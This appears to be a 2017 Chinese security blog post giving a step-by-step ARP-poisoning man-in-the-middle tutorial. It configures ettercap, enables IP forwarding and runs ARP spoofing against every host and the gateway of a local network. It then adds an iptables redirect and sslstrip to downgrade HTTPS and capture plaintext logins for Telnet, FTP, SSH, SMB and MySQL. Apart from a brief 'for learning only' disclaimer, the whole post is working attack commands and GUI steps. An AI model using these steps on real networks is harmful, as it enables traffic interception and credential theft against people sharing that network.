---
layout: post
title: 内网王者之arp攻击
date: 2017-04-14 22:48:19
comments: true
tags:
	- 安全攻防
---


### 前言
><font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>


### 正文
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中间人攻击是好久之前的攻击手段了，早在高三的时候就已经玩透了。应该还有很多人不了解内网安全，我这里还是写出来一下。对于zANTI和DSploit这种就不多说了，我们这里使用老牌套件ettercap<!--more-->

### 配置

更改ettercap配置文件

    vi /etc/ettercap/etter.conf

esc键 然后 冒号(:) 然后 / 输入Linux。
在配置文件中找到Linux字符串。

> ![](/images/pasted-90.jpg)

然后开启暂时路由转发

    echo 1 > /proc/sys/net/ipv4/ip_forward

> ![](/images/pasted-91.jpg)

    * ettercap -i eth0 -Tq -M arp:remote /ip// /网关//

 * -i 选择网卡

 * -T 文本模式

 * -M Mitm

* 后面的两组/，如果我选择内网里所有目标，可以不填ip。

上面说的是命令行中攻击，当然ettercap也有图形化，下面我们使用图形化来简化攻击流程。

ettercap -G 运行图形化，选择Sniff => Unified sniffing , 来选择网卡 

> ![](/images/pasted-92.jpg)

然后Hosts => Scan for host 来扫描内网中的设备

> ![](/images/pasted-93.jpg)

扫描完毕后Host List显示内网中所有的设备

> ![](/images/pasted-94.jpg)

设备全部选择后，在把网关添加到target 1  其他设备添加到target 2中，

然后选择Mitm => ARP poisoning 选择攻击模式

> ![](/images/pasted-95.jpg)

勾上 Sniff remote connections，确定

> ![](/images/pasted-96.jpg)

最后start => Start sniffing  开始攻击

> ![](/images/pasted-97.jpg)

<br/>

如果网站用了ssl加密呢，那么可以使用sslstrip来针对ssl的攻击。

10000为sslstrip的监听端口

 *  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000

开启sslstrip，并且监听；

 * sslstrip -l 10000

sslstrip会把https网址强制转换成http，然后再通过arp攻击就可以抓取明文信息了。	

### 总结

攻击后受害者的所有流量都会经过攻击者，ettercap会自动抓取 TELNET、FTP、SSH、SMB、MySQL等等一些协议信息，同时也可以开wireshark来抓取更多的信息。